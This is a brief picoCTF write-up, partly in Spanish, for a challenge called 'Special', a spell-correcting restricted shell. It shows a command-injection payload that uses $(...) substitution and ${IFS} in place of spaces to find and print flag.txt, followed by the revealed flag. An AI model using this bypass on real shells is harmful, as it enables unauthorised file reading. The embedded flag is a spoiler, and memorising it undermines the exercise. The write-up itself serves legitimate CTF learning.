Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
## Solución
```
dastruker-academy@webshell:/$ ssh ctf-player@saturn.picoctf.net -p 51361

Special$ $(cat${IFS}$(find${IFS}.${IFS}-name${IFS}flag.txt))
$(cat${IFS}$(find${IFS}.${IFS}-name${IFS}flag.txt)) 
sh: 1: picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}: not found

```
Busque flag mediante find, y agregué cat
## Notas Adicionales
volvia la primera letra que escribia a mayuscula
